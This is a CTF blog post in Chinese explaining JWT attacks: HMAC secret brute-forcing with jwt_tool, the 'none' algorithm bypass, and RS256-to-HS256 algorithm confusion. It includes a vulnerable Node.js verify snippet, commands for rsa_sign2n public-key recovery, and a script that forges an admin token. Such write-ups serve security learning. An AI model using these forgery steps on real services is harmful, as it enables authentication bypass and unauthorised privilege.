---
title: JMT
author: Creexile
date: 2025-12-30
lastMod: 2025-12-30
summary: ''
cover: ''
category: CTF
draft: false
comments: false
sticky: 0
tags:
  - JWT
---

参考文章

1. [知乎-破解 JWT：漏洞赏金猎人指南（第七部分）——最终的 P1 Boss](https://zhuanlan.zhihu.com/p/1922990289649378959)
2. [博客园-JWT攻防实战：混淆、破解与红队利用技术](https://www.cnblogs.com/qife122/p/19114704)
3. [个人博客-Abusing JWT public keys without the public key](https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/)

# JWT是什么

JWT（JSON Web Token）是一种紧凑的URL安全方法, 用于在双方之间传递声明信息, 主要用于无状态认证, JWT通常通过Cookie、HTTP头部或本地存储传递

JWT包含3个Base64编码部分：

```undefined
<头部>.<载荷>.<签名>
```

如果没有强制设置服务器验证JWT的方式, JWT认证是很容易被绕过的

JWT 可以使用以下方式签名：

- RS256：非对称（公共/私人 RSA）
- HS256：对称（共享秘密 HMAC）

# 破解技术

## HMAC密钥暴力破解(HS256)

当JWT使用弱密钥签名时可以使用[jwt_tool](https://github.com/ticarpi/jwt_tool)爆破密钥

```bash
python3 jwt_tool.py <token> -C -S <字典文件>
```

jwt_tool.py的一些简单使用

```bash
# 解码JWT各部分
jwt_tool.py <token> -d

# 破解密钥
jwt_tool.py <token> -C -S rockyou.txt

# 尝试none算法
jwt_tool.py <token> -S none

# 修改并重新签名
jwt_tool.py <token> -E -pc 'secret' -A HS256
```

## none算法攻击

早期JWT库允许使用`{"alg":"none"}`，并完全忽略签名

```bash
python3 jwt_tool.py <token> -S none
```

## JWT算法混淆

算法混淆发生在以下情况：为RS256配置的服务器错误地接受HS256并使用RSA公钥作为HMAC密钥

你可以利用该伪造任何JWT且无需私钥, 或者获取公钥

### 漏洞利用-有公钥

直接利用jwt_tool改为HS256并用公钥签名

```bash
python3 jwt_tool.py <token> -X -pk public.pem -A HS256
```

> `CVE-2018-0114`使此攻击广为人知

### 漏洞利用-无公钥

一道ctf的源码, 你发现了首先使用RSA公钥, 然后`decode()`接受HS256方式验证签名

```javascript
const jwt = require('jsonwebtoken')
const fs = require('fs')

const publicKey = fs.readFileSync('./publickey.pem', 'utf8')
const privateKey = fs.readFileSync('./privatekey.pem', 'utf8')

module.exports = {
  async sign(data) {
    data = Object.assign(data)
    return await jwt.sign(data, privateKey, { algorithm: 'RS256' })
  },
  async decode(token) {
    return await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] })
  },
}
```

使用的是这个工具: [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n)

该工具在ubuntu上运行良好, 你也可以用ubuntu; 使用方式为获取两个合法的jwt, 塞给他就可以了

```bash
python3 jwt_forgery.py <jwt1> <jwt2>
```

现在它会给出一堆可能的测试用jwt和公钥, 使用测试的jwt进行测试, 如果返回正常那么这个公钥就可以使用

用下面这个脚本生成对应的jwt即可获取权限

```python
const jwt = require('jsonwebtoken');
const fs = require('fs');
const publicKey  = fs.readFileSync('./b3ec3db187fa955c_65537_x509.pem', 'utf8');
data={
    username: "admin", priviledge:'File-Priviledged-User'
}
data = Object.assign(data);
console.log( jwt.sign(data, publicKey, { algorithm:'HS256'}))
```
